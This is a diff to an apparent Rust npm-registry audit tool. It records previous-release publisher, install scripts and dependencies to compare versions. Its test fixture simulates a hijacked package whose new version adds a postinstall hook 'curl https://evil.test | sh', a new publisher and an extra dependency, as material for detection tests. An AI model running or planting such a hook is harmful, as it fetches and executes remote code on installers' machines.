@@ -252,10 +252,23 @@ struct Packument {
     repository: Option<RepoField>,
 }
 
+fn install_scripts(doc: &VersionDoc) -> Vec<InstallScript> {
+    doc.scripts
+        .iter()
+        .filter(|(hook, _)| INSTALL_HOOKS.contains(&hook.as_str()))
+        .map(|(name, command)| InstallScript {
+            name: name.clone(),
+            command: command.clone(),
+        })
+        .collect()
+}
+
 #[derive(Debug, Deserialize)]
 struct VersionDoc {
     #[serde(default)]
     scripts: BTreeMap<String, String>,
+    #[serde(default)]
+    dependencies: BTreeMap<String, String>,
     #[serde(default)]
     deprecated: Option<serde_json::Value>,
     #[serde(default)]
@@ -306,15 +319,7 @@ fn parse_packument(
         RegistryError::Decode(format!("{url}: dist-tag '{version}' has no version entry"))
     })?;
 
-    let install_scripts = doc
-        .scripts
-        .iter()
-        .filter(|(hook, _)| INSTALL_HOOKS.contains(&hook.as_str()))
-        .map(|(name, command)| InstallScript {
-            name: name.clone(),
-            command: command.clone(),
-        })
-        .collect();
+    let hooks = install_scripts(doc);
 
     let repository = doc
         .repository
@@ -338,6 +343,12 @@ fn parse_packument(
         previous_release(&entries, &version, published_at)
     };
 
+    let previous_version = previous.as_ref().map(|(version, _)| version.clone());
+    let previous_time = previous.as_ref().map(|(_, time)| *time);
+    let previous_doc = previous_version
+        .as_ref()
+        .and_then(|version| packument.versions.get(version));
+
     Ok(PackageMeta {
         name: packument.name.unwrap_or_else(|| spec.name.clone()),
         version,
@@ -353,7 +364,7 @@ fn parse_packument(
             .collect(),
         publisher: doc.npm_user.as_ref().and_then(|user| user.name.clone()),
         maintainers_known: true,
-        install_scripts,
+        install_scripts: hooks,
         build_from_source: false,
         repository,
         deprecated: normalize_deprecated(doc.deprecated.clone()),
@@ -361,9 +372,16 @@ fn parse_packument(
         review_url: None,
         latest_version,
         release: ReleaseHistory {
-            previous_version: previous.as_ref().map(|(previous, _)| previous.clone()),
-            previous_published_at: previous.map(|(_, time)| time),
-            ..ReleaseHistory::default()
+            previous_version,
+            previous_published_at: previous_time,
+            previous_publisher: previous_doc
+                .and_then(|doc| doc.npm_user.as_ref())
+                .and_then(|user| user.name.clone()),
+            previous_install_scripts: previous_doc.map(install_scripts).unwrap_or_default(),
+            previous_dependencies: previous_doc
+                .map(|doc| doc.dependencies.keys().cloned().collect())
+                .unwrap_or_default(),
+            dependencies: doc.dependencies.keys().cloned().collect(),
         },
     })
 }
@@ -511,6 +529,43 @@ mod tests {
     fn the_previous_release_skips_the_audited_entry() {
         let versions = [("1.0.0", Some(100)), ("1.0.0", Some(100))];
         assert_eq!(previous_release(&versions, "1.0.0", Some(100)), None);
+    }
+
+    const HISTORY: &str = r#"{
+        "name": "hijacked",
+        "dist-tags": { "latest": "2.0.0" },
+        "time": {
+            "1.0.0": "2024-01-01T00:00:00.000Z",
+            "2.0.0": "2024-02-01T00:00:00.000Z"
+        },
+        "versions": {
+            "1.0.0": {
+                "scripts": { "postinstall": "node build.js" },
+                "dependencies": { "left-pad": "^1.0.0" },
+                "_npmUser": { "name": "alice" }
+            },
+            "2.0.0": {
+                "scripts": { "postinstall": "curl https://evil.test | sh" },
+                "dependencies": { "left-pad": "^1.0.0", "event-stream": "^4.0.0" },
+                "_npmUser": { "name": "mallory" }
+            }
+        }
+    }"#;
+
+    #[test]
+    fn records_the_previous_release_details() {
+        let meta = fetch(HISTORY, None).unwrap();
+        assert_eq!(meta.release.previous_version.as_deref(), Some("1.0.0"));
+        assert_eq!(meta.release.previous_publisher.as_deref(), Some("alice"));
+        assert_eq!(meta.release.previous_install_scripts.len(), 1);
+        assert_eq!(
+            meta.release.previous_dependencies,
+            vec!["left-pad".to_string()]
+        );
+        assert_eq!(
+            meta.release.dependencies,
+            vec!["event-stream".to_string(), "left-pad".to_string()]
+        );
     }
 
     #[test]
